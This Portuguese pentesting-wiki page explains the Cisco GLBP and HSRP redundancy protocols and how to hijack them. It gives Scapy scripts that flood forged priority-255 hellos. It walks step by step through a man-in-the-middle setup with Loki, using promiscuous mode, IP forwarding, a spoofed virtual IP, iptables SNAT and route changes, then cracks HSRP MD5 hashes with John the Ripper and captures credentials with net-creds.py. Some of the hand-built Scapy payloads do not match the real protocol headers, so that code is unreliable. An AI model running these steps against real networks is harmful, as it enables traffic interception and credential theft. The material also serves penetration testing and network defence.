# GLBP & HSRP Ataques

{{#include ../../banners/hacktricks-training.md}}


## Visão Geral de FHRP Hijacking

### Informações sobre FHRP

FHRP foi projetado para fornecer robustez à rede ao agrupar múltiplos roteadores em uma única unidade virtual, melhorando assim a distribuição de carga e a tolerância a falhas. A Cisco Systems introduziu protocolos proeminentes nesta suite, como GLBP e HSRP.

### Informações sobre o Protocolo GLBP

A criação da Cisco, GLBP, opera na stack TCP/IP, utilizando UDP na porta 3222 para comunicação. Roteadores em um grupo GLBP trocam pacotes "hello" em intervalos de 3 segundos. Se um roteador deixar de enviar esses pacotes por 10 segundos, presume‑se que esteja offline. No entanto, esses temporizadores não são fixos e podem ser modificados.

GLBP para IPv6 usa multicast **FF02::66** sobre UDP/3222, e o formato do MAC virtual torna‑se `0007.b4xx.xxyy` (o AVF ID está no último byte). Temporização e superfície de ataque permanecem as mesmas do IPv4, portanto as técnicas de hijack ainda funcionam em redes dual‑stack.

### Operações do GLBP e Distribuição de Carga

O GLBP se destaca ao permitir a distribuição de carga entre roteadores usando um único IP virtual acoplado a múltiplos endereços MAC virtuais. Em um grupo GLBP, todos os roteadores participam do encaminhamento de pacotes. Diferente de HSRP/VRRP, o GLBP oferece balanceamento de carga genuíno através de vários mecanismos:

- **Host-Dependent Load Balancing:** Mantém a atribuição consistente do endereço MAC AVF para um host, essencial para configurações NAT estáveis.
- **Round-Robin Load Balancing:** A abordagem padrão, alternando a atribuição do MAC AVF entre hosts solicitantes.
- **Weighted Round-Robin Load Balancing:** Distribui a carga com base em métricas de "Weight" predefinidas.

### Componentes-chave e Terminologia do GLBP

- **AVG (Active Virtual Gateway):** O roteador principal, responsável por alocar endereços MAC para roteadores pares.
- **AVF (Active Virtual Forwarder):** Um roteador designado para gerenciar o tráfego de rede.
- **GLBP Priority:** Uma métrica que determina o AVG, começando com o valor padrão 100 e variando entre 1 e 255.
- **GLBP Weight:** Reflete a carga atual em um roteador, ajustável manualmente ou via Object Tracking.
- **GLBP Virtual IP Address:** Serve como o gateway padrão da rede para todos os dispositivos conectados.

Para interações, o GLBP emprega o endereço multicast reservado 224.0.0.102 e a porta UDP 3222. Roteadores transmitem pacotes "hello" em intervalos de 3 segundos, e são considerados não operacionais se um pacote for perdido por um período de 10 segundos.

### Mecanismo de Ataque do GLBP

Um atacante pode se tornar o roteador primário enviando um pacote GLBP com o valor de prioridade mais alto (255). Isso pode levar a ataques DoS ou MITM, permitindo interceptação ou redirecionamento de tráfego.

**Prático GLBP hijack com Scapy (PoC curto)**
```python
from scapy.all import *

vip = "10.10.100.254"          # learned from sniffing
pkt = IP(dst="224.0.0.102")/UDP(dport=3222,sport=3222)/Raw(
b"\x01\x00\xff\x64"      # Version=1, Opcode=Hello, Priority=255, Weight=100
)
send(pkt, iface="eth0", loop=1, inter=1)
```
Crie os bytes do payload para imitar o header GLBP (version/opcode/priority/weight/VRID). Repetir o frame garante que você vença a eleição do AVG se não houver autenticação.

### Executando um ataque GLBP com Loki

[Loki](https://github.com/raizo62/loki_on_kali) pode executar um ataque GLBP injetando um pacote com priority e weight definidos como 255. As etapas pré-ataque envolvem coletar informações como o endereço IP virtual, presença de autenticação e valores de prioridade do roteador usando ferramentas como Wireshark.

Attack Steps:

1. Ative o promiscuous mode e habilite IP forwarding.
2. Identifique o roteador alvo e recupere seu IP.
3. Gere um Gratuitous ARP.
4. Injete um pacote GLBP malicioso, se passando pelo AVG.
5. Atribua um IP secundário à interface de rede do atacante, espelhando o virtual IP do GLBP.
6. Implemente SNAT para visibilidade completa do tráfego.
7. Ajuste o roteamento para garantir acesso à internet contínuo através do roteador AVG original.

Seguindo esses passos, o atacante se posiciona como um "man in the middle", capaz de interceptar e analisar o tráfego de rede, incluindo dados não criptografados ou sensíveis.

Para demonstração, aqui estão os trechos de comando necessários:
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
Monitoring and interceptação de tráfego podem ser feitas usando net-creds.py ou ferramentas similares para capturar e analisar os dados que trafegam pela rede comprometida.

### Explicação passiva de HSRP Hijacking com detalhes dos comandos

#### Visão geral de HSRP (Hot Standby Router/Redundancy Protocol)

HSRP é um protocolo proprietário da Cisco projetado para redundância de gateway de rede. Ele permite a configuração de múltiplos roteadores físicos em uma única unidade lógica com um endereço IP compartilhado. Essa unidade lógica é gerida por um roteador primário responsável por direcionar o tráfego. Ao contrário do GLBP, que usa métricas como priority e weight para balanceamento de carga, o HSRP depende de um único roteador ativo para o gerenciamento do tráfego.

HSRPv1 uses multicast **224.0.0.2** and virtual MAC `0000.0c07.acXX`; HSRPv2 and HSRPv2 for IPv6 use **224.0.0.102 / FF02::66** and virtual MAC `0000.0c9f.fXXX`. UDP destination port is **1985** for IPv4 and **2029** for IPv6.

#### Funções e terminologia em HSRP

- **HSRP Active Router**: O dispositivo que atua como gateway, gerenciando o fluxo de tráfego.
- **HSRP Standby Router**: Um roteador de backup, pronto para assumir caso o roteador ativo falhe.
- **HSRP Group**: Um conjunto de roteadores que colaboram para formar um único roteador virtual resiliente.
- **HSRP MAC Address**: Um endereço MAC virtual atribuído ao roteador lógico na configuração HSRP.
- **HSRP Virtual IP Address**: O endereço IP virtual do grupo HSRP, atuando como gateway padrão para os dispositivos conectados.

#### Versões do HSRP

O HSRP existe em duas versões, HSRPv1 e HSRPv2, que diferem principalmente na capacidade de grupo, no uso de IP multicast e na estrutura do endereço MAC virtual. O protocolo utiliza endereços IP multicast específicos para troca de informações de serviço, com pacotes Hello enviados a cada 3 segundos. Um roteador é presumido inativo se nenhum pacote for recebido dentro de um intervalo de 10 segundos.

#### Mecanismo de ataque do HSRP

Ataques HSRP envolvem tomar forçadamente o papel do Roteador Ativo injetando um valor de prioridade máximo. Isso pode levar a um Man-In-The-Middle (MITM). Etapas essenciais antes do ataque incluem coletar dados sobre a configuração HSRP, o que pode ser feito usando o Wireshark para análise de tráfego.

**Quick HSRP takeover with Scapy**
```python
from scapy.all import *

vip = "10.10.100.1"
pkt = IP(dst="224.0.0.102")/UDP(sport=1985,dport=1985)/Raw(
b"\x00\x02\xff\x03\x00\x00\x00\x01"  # Hello, priority 255, group 1
)
send(pkt, iface="eth0", inter=1, loop=1)
```
Se a autenticação **não** estiver configurada, enviar continuamente hellos com prioridade maior força os pares para os estados *Speak*/*Listen* e permite que você se torne *Active*, redirecionando o tráfego através do seu host.

**HSRP authentication corner cases**

- A autenticação legada em plain-text é trivialmente falsificável.
- A autenticação MD5 cobre apenas o payload do HSRP; pacotes forjados ainda podem causar rate-limit/DoS nos planos de controle. Releases do NX-OS anteriormente permitiam DoS contra grupos autenticados (veja o advisory da Cisco CSCup11309).
- Em muitas VLANs compartilhadas de ISP / VPS, multicasts do HSRPv1 são visíveis para tenants; sem auth você pode entrar e preemptar o tráfego.

#### Etapas para contornar a autenticação do HSRP

1. Salve o tráfego de rede contendo dados HSRP em um arquivo .pcap.
```shell
tcpdump -w hsrp_traffic.pcap
```
2. Extraia hashes MD5 do arquivo .pcap usando hsrp2john.py.
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. Quebre os hashes MD5 usando John the Ripper.
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Executando HSRP Injection com Loki**

1. Execute o Loki para identificar anúncios do HSRP.
2. Coloque a interface de rede em modo promíscuo e habilite IP forwarding.
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Use o Loki para direcionar o roteador específico, insira a senha HSRP quebrada e faça as configurações necessárias para se passar pelo Active Router.
4. Após obter o papel de Active Router, configure sua interface de rede e iptables para interceptar o tráfego legítimo.
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. Modifique a tabela de roteamento para encaminhar o tráfego através do antigo Active Router.
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. Use net-creds.py ou um utilitário similar para capturar credenciais do tráfego interceptado.
```shell
sudo python2 net-creds.py -i eth0
```

Executar esses passos coloca o atacante na posição de interceptar e manipular o tráfego, semelhante ao procedimento para GLBP hijacking. Isso destaca a vulnerabilidade em protocolos de redundância como HSRP e a necessidade de medidas de segurança robustas.

## Referências

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- [Cisco NX-OS HSRP authentication DoS (CSCup11309)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/Cisco-SA-20140611-CVE-2014-3295)
- [Reddit: HSRP seen on VPS shared VLANs](https://www.reddit.com/r/networking/comments/1h0v1aq/hsrp_seen_on_cloud_vlans_without_auth/)
{{#include ../../banners/hacktricks-training.md}}
